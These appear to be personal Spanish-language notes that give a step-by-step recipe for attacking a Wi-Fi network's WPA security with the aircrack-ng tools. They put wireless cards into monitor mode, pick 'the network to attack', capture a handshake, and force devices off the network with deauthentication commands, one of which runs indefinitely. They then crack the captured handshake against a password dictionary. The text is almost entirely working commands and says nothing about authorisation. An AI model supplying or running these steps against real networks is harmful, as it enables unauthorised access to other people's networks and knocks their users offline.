Abrir terminal 
Logearse sudo
airmon-ng (lista todas las tarjetas que soportan modo monitor)

airmon-ng start wlan0

otra terminal, logearse sudo
airodump-ng wlan0mon

Muestra las redes inhalambricas y los dispositivos conectados a los access points
Elegimos a red a atacar

ESSID Nombre de la red
CH Channell
BSSID Nro Mac address

Nueva terminal sudo bash
airodump-ng -c 11 --bssid ee:ee:ee:ee:ee -w /home/kali/claves wlan0mn  // queda corriendo en una terminal para esperar handshake
               !            !                   !
               !            !                   -- Ruta al archivo donde vamos a escribir el escaner
               !            !
               !            ---------------------- Bssid del router
               !
               ----------------------------------- Channel

Monitorea la red seleccionada esperando que un dispositivo se conecte al router para que intercambien el handshake

Comprobamos que en la carpeta se crearon los archivos con el nombre Clave con la informacion que necesitamos

Nueva terminal sudo bash (utilizar una de ambas)
aireplay-ng -0 2 -a ee:ee:ee:ee:ee -c dd:dd:dd:dd:dd wlan0mon
aireplay/ng --deauth 0 -a ee:ee:ee:ee:ee wlan0mon  // esta desautentica eternamente hasta que se para 

nueva terminal sudo bash
aircrack-ng /home/kali/*.cap -w /ruta/al/diccionari.txt // ruta al archivo cap y ruta al archivo del diccionario

